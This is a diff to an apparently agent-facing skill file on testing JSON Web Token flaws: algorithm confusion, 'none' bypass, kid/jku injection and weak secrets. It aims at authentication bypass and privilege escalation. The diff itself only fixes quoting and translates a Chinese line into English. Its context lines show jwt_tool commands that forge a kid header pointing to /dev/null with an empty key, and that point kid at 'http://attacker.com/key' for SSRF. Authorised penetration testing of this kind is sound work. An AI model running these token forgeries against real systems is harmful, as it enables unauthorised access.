@@ -1,7 +1,7 @@
 ---
 name: testing-for-json-web-token-vulnerabilities
 description: "Tests JWT algorithm confusion and none algorithm bypass. Signals: API attacks, interface testing, GraphQL."
-zh-signals: "Tests JWT implementations for algorithm confusion, \'none\' algorithm bypass 信号:api攻击,接口测试,graphql。"
+zh-signals: "Tests JWT implementations for algorithm confusion, 'none' algorithm bypass 信号:api攻击,接口测试,graphql。"
 when-to-use: Tests JWT implementations for algorithm confusion, "none" algorithm bypass,
   kid/jku parameter injection, and weak secret exploitation using jwt_tool and Burp Suite's
   JWT Editor extension, aiming to achieve authentication bypass and privilege escalation.
@@ -145,4 +145,4 @@ python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""
 # SSRF via kid (if kid fetches remote key)
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "http://attacker.com/key"
 
-> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
+> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
